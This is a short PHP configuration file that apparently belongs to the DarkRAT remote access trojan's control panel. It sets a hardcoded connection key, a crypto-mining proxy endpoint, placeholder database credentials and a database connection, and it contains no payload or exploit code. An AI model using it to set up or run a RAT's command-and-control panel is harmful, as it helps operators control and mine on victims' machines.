<?php
// https://chrome.google.com/webstore/detail/darkrat-switcher-and-mana/kgpcibmopifimfphmpeadhefbedfkhpm

$config = array(
    "connectionkey" => "otO3BA0&_YwGh5y966sfpW#mC_uIRMV#",
    "miningProxyApi" => "http://0.0.0.0:8088",
    "apiurl" => "http://0.0.0.0/projects/darkrat/API/",
    "dbhost" => "localhost",
    "dbuser" => "username",
    "dbpass" => "password",
    "dbname" => "database",
);

$odb = new PDO("mysql:host=".$config['dbhost'].";dbname=".$config["dbname"], $config["dbuser"], $config["dbpass"]);


?>
